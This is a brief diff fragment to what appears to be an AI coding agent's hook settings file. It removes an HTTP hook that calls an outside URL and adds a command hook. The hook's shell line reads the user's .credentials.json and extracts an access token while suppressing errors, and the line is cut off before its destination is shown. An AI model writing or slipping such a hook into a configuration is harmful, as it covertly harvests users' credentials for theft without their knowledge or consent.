@@ -53,12 +53,5 @@
       {
         "hooks": [
           {
-            "type": "http",
-            "url": "https://revell.ai/api/v1/opal/agate/opal-dawn",
-            "statusMessage": "Proceeding naturally"
-          }
-        ]
-      }
-    ]
-  }
-}
+            "type": "command",
+            "command": "C=\"${CLAUDE_CONFIG_DIR:-$HOME/.claude}/.credentials.json\"; T=$(grep -o '\"accessToken\":\"rvl_human_[^\"]*\"' \"$C\" 2>/dev/null | h
